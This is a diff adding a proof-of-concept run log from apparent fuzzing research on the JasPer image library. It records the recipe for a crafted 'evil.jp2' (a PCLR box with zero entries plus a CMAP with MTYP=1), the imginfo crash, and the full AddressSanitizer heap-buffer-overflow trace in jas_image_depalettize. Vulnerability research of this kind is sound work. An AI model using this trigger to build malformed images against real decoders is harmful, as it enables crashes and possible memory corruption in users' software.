@@ -1,0 +1,67 @@
+[*] Generating minimal 1x1 JPC codestream via jasper encoder...
+    JPC codestream: 160 bytes
+[*] Assembling malicious JP2 with PCLR NE=0 + CMAP MTYP=1...
+[+] Written: /data/ylwang/non-textfuzz/target/_poc/jasper/src_appl_dummy_c/evil.jp2 (285 bytes)
+[+] Trigger: PCLR(NE=0,NPC=1) + CMAP(MTYP=1,PCOL=0)
+[+] Expected: ASAN heap-buffer-overflow at jas_image_depalettize lutents[-1]
+
+[*] Running: imginfo -f evil.jp2
+timeout: the monitored command dumped core
+[*] imginfo exit code: 134
+[*] ASAN log files found:
+    /data/ylwang/non-textfuzz/target/_poc/jasper/src_appl_dummy_c/asan.log.2459315
+=================================================================
+==2459315==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000588 at pc 0x5563ef604deb bp 0x7ffc670aac20 sp 0x7ffc670aac10
+READ of size 8 at 0x502000000588 thread T0
+    #0 0x5563ef604dea in jas_image_depalettize (/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo+0x4d9dea)
+    #1 0x5563ef655c47 in jp2_decode (/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo+0x52ac47)
+    #2 0x5563ef5fe4ef in jas_image_decode (/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo+0x4d34ef)
+    #3 0x5563ef5f08f5 in main (/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo+0x4c58f5)
+    #4 0x7f983d92bd8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
+    #5 0x7f983d92be3f in __libc_start_main_impl ../csu/libc-start.c:392
+    #6 0x5563ef5f1bc4 in _start (/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo+0x4c6bc4)
+
+0x502000000588 is located 8 bytes to the left of 1-byte region [0x502000000590,0x502000000591)
+allocated by thread T0 here:
+    #0 0x7f983e37c887 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
+    #1 0x5563ef612800 in jas_alloc2 (/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo+0x4e7800)
+    #2 0x5563ef655804 in jp2_decode (/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo+0x52a804)
+    #3 0x5563ef5fe4ef in jas_image_decode (/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo+0x4d34ef)
+    #4 0x5563ef5f08f5 in main (/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo+0x4c58f5)
+    #5 0x7f983d92bd8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow (/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo+0x4d9dea) in jas_image_depalettize
+Shadow bytes around the buggy address:
+  0x0a047fff8060: fa fa fd fa fa fa fd fa fa fa fd fd fa fa fd fa
+  0x0a047fff8070: fa fa 01 fa fa fa fd fd fa fa fd fd fa fa fd fa
+  0x0a047fff8080: fa fa fd fa fa fa fd fd fa fa fd fa fa fa fd fa
+  0x0a047fff8090: fa fa fd fd fa fa fd fa fa fa fd fa fa fa fd fa
+  0x0a047fff80a0: fa fa fd fa fa fa fd fa fa fa fd fa fa fa 00 fa
+=>0x0a047fff80b0: fa[fa]01 fa fa fa 01 fa fa fa fa fa fa fa fa fa
+  0x0a047fff80c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0a047fff80d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0a047fff80e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0a047fff80f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0a047fff8100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+  Shadow gap:              cc
+==2459315==ABORTING
+[+] VERIFIED_CRASH: imginfo crashed on evil.jp2
